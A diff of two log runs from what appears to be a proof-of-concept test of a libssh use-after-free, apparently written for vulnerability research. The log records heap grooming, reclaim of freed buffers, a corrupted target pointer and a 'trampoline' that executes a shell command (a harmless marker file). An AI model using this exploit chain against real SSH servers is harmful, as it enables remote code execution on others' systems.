@@ -1,4 +1,4 @@
-[2026/11/25 12:43:36.475719, 1] ssh_strict_fopen:  Failed to open a file /etc/ssh/ssh_known_hosts for reading: No such file or directory
+[2026/11/25 13:16:12.620243, 1] ssh_strict_fopen:  Failed to open a file /etc/ssh/ssh_known_hosts for reading: No such file or directory
 SERVER auth len user=5 pass=9 success=0
 CLIENT auth rc=0
 SERVER registered callbacks on channel 43
@@ -9,13 +9,13 @@ CLIENT sent groom wire pointer=0x4838a0 survive=0
 CLIENT sent close+data marker=MISHE-LIBSSH-UAF-WIRE
 SERVER close callback
 SERVER data #2 len=128 first=t off16=i
-SERVER nodetach saved_buf=0x179d4b50 saved_it=0x179d4690
-[2026/11/25 12:43:37.662887, 1] ssh_socket_exception_callback:  Socket exception callback: 2 (32)
-SERVER groom alloc=0x179d4ac0 wire_off120=0x4838a0 target=0x4838a0 survive=0
-SERVER nodetach reclaim it=0x179d4690 want=0x179d4690 buf=0x179d4b50 want=0x179d4b50
+SERVER nodetach saved_buf=0x3c46db50 saved_it=0x3c46d690
+[2026/11/25 13:16:13.803065, 1] ssh_socket_exception_callback:  Socket exception callback: 2 (32)
+SERVER groom alloc=0x3c46dac0 wire_off120=0x4838a0 target=0x4838a0 survive=0
+SERVER nodetach reclaim it=0x3c46d690 want=0x3c46d690 buf=0x3c46db50 want=0x3c46db50
 SERVER EXEC trampoline cmd=touch evidence-wire-vuln-groom-exec.marker
 SERVER EXEC rc=0
 SERVER done data_packets=2 marker_hits=0
 SERVER exec rc=0
-SERVER target_after=0x41414141414141c1 groom_ptr=0x179d4ac0
+SERVER target_after=0x41414141414141c1 groom_ptr=0x3c46dac0
 CLIENT rc=0 SERVER status=0x0
